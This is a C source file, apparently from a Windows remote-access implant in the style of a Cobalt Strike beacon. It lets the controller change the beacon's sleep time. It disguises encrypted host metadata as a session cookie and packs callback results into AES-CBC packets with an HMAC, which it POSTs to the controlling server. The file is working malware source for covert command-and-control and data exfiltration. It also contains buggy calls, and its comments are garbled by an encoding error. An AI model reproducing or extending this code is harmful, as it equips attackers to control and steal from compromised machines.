#define _TIMESPEC_DEFINED  // ��ֹ windows.h �ظ����� timespec
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include "Command.h"
#include "Http.h"
#pragma warning(disable:4996)

extern int SleepTime;
extern int Counter;
extern unsigned char AESRandaeskey[16];
extern int clientID;

VOID CmdChangSleepTimes(unsigned char* CommandBuf) {
    uint8_t buf[4];
    memcpy(buf, CommandBuf, 4);
    uint32_t sleep = bigEndianUint32(buf);
    SleepTime = sleep;
}

wchar_t* makeMetaData() {
    EncryMetadataResult EncryMetainfos = EncryMetadata();
    unsigned char* EncryMetainfo = EncryMetainfos.EncryMetadata;
    int EncryMetainfolen = EncryMetainfos.EncryMetadataLen;

    unsigned char* baseEncodeMetadata = base64Encode(EncryMetainfo, EncryMetainfolen);

    size_t headers_length = strlen(metadata_header) + strlen(metadata_prepend);

    unsigned char* headerstart = (unsigned char*)malloc(headers_length + 1);
    if (headerstart) {
        memcpy(headerstart, metadata_header, strlen(metadata_header));
        memcpy(headerstart + strlen(metadata_header), metadata_prepend, strlen(metadata_prepend));
        headerstart[headers_length] = '\0';
    }
    //header[] = "Cookie: SESSIONID=";
    unsigned char* concatenatedString = (unsigned char*)malloc(strlen(headerstart) + strlen(baseEncodeMetadata) + 1);
    if (concatenatedString) {
        strcpy(concatenatedString, headerstart);
        strcat(concatenatedString, baseEncodeMetadata);
        // ת��Ϊ���ַ�
        int wideLen = MultiByteToWideChar(CP_ACP, 0, concatenatedString, -1, NULL, 0);
        wchar_t* wConcatenatedString = (wchar_t*)malloc(wideLen * sizeof(wchar_t));
        if (!wConcatenatedString) {
            fprintf("Memory allocatin failed", GetLastError());
            free(concatenatedString);
            return;
        }
        MultiByteToWideChar(CP_ACP, 0, concatenatedString, -1, wConcatenatedString, wideLen);
        wcscat(wConcatenatedString, L"\r\n"); // �������ͷ��β

        free(headerstart);
        free(baseEncodeMetadata);
        free(concatenatedString);

        return wConcatenatedString;
    }
}

static BOOL append_data(unsigned char** buf, size_t* buf_length, size_t* buf_capacity, unsigned char* data, size_t dataLen) {
    if (*buf_length + dataLen > *buf_capacity) {
        // ����
        *buf_capacity = *buf_length + dataLen + 512; 
        unsigned char* new_buf = (unsigned char*)realloc(*buf, *buf_capacity);
        if (!new_buf) {
            fprintf(stderr, "realloc failed\n");
            free(*buf);
            *buf = NULL;
            return FALSE;
        }
        *buf = new_buf;
    }
    memcpy(*buf + *buf_length, data, dataLen);
    *buf_length += dataLen;
    return TRUE;
}

unsigned char* MakePacket(int callback, unsigned char* postMsg, size_t msgLen, size_t* msg_length) {
    Counter += 1;

    size_t buf_capacity = 1024; // ��ʼ����������
    size_t buf_length = 0;
    unsigned char* buf = (unsigned char*)malloc(buf_capacity);
    if (!buf) {
        fprintf(stderr, "Memory allocation failed\n");
        return NULL;
    }

    // ��� Counter
    uint8_t counterBytes[4];
    PutUint32BigEndian(counterBytes, (uint32_t)Counter);
    if (!append_data(&buf, &buf_length, &buf_capacity, counterBytes, 4)) {
		fprintf(stderr, "append_data failed for counterBytes\n");
        return NULL;
    }

    // ��ӽ������
    if (postMsg) {
        uint8_t resultLenBytes[4];
        int resultLen = (int)msgLen + 4;
        PutUint32BigEndian(resultLenBytes, (uint32_t)resultLen);
        if (!append_data(&buf, &buf_length, &buf_capacity, resultLenBytes, 4)) {
            fprintf(stderr, "append_data failed for msgLen\n");
            free(buf);
			return NULL;
        }
    }

    // ��� callback
    uint8_t callbackTypeBytes[4];
    PutUint32BigEndian(callbackTypeBytes, (uint32_t)callback);
    if (!append_data(&buf, &buf_length, &buf_capacity, callbackTypeBytes, 4)) {
		fprintf(stderr, "append_data failed for callbackTypeBytes\n");
        free(buf);
        return NULL;
    }

    // ��� postMsg
    if (postMsg && msgLen > 0) {
        if (!append_data(&buf, &buf_length, &buf_capacity, postMsg, msgLen)) {
			fprintf(stderr, "append_data failed for postMsg\n");
            return NULL;
        }
    }

    // AES CBC ����
    size_t decryptAES_CBCdatalen;
    unsigned char* EncryptAES_CBCdata = AesCBCEncrypt(buf, AESRandaeskey, buf_length, &decryptAES_CBCdatalen);
    free(buf);

    if (!EncryptAES_CBCdata) {
        fprintf(stderr, "AesCBCEncrypt failed\n");
        return NULL;
    }

    unsigned char* encrypted = EncryptAES_CBCdata + 16; // ���HMAC Hash
    size_t encryptedBytesLen = decryptAES_CBCdatalen - 16;

    // �����������ݰ�
	// decryptAES_CBCdatalen(4Bytes) | encryptedBytes(decryptAES_CBCdatalen - 16 Bytes) | HMAC(16Bytes)
    int sendLength = decryptAES_CBCdatalen;
    size_t finalBufLen = 4 + encryptedBytesLen + 16;
    unsigned char* finalBuf = (unsigned char*)malloc(finalBufLen);
    if (!finalBuf) {
        fprintf(stderr, "Memory allocation failed\n");
        free(EncryptAES_CBCdata);
        return NULL;
    }

    uint8_t sendLenBigEndian[4];
    PutUint32BigEndian(sendLenBigEndian, (uint32_t)sendLength);
    memcpy(finalBuf, sendLenBigEndian, 4);
    memcpy(finalBuf + 4, encrypted, encryptedBytesLen);

    unsigned char* hmacResult = HMkey(encrypted, encryptedBytesLen);
    memcpy(finalBuf + 4 + encryptedBytesLen, hmacResult, 16);

    *msg_length = finalBufLen;

    free(hmacResult);
    free(EncryptAES_CBCdata);

    return finalBuf;
}

VOID DataProcess(unsigned char* postMsg, size_t msgLen, int callbackType) {
    postMsg[msgLen] = '\0';

    unsigned char* BeaconIdHeader = makeBeaconIdHeader();
    unsigned char* dataString = makePostData(postMsg, msgLen, callbackType);
    size_t dataSize = strlen((char*)dataString);

    wchar_t BeaconIdWideHeader[256];
    MultiByteToWideChar(CP_ACP, 0, BeaconIdHeader, -1, BeaconIdWideHeader, 256);

    POST(dataString, dataSize, BeaconIdWideHeader);
	free(dataString);
    free(BeaconIdHeader);
}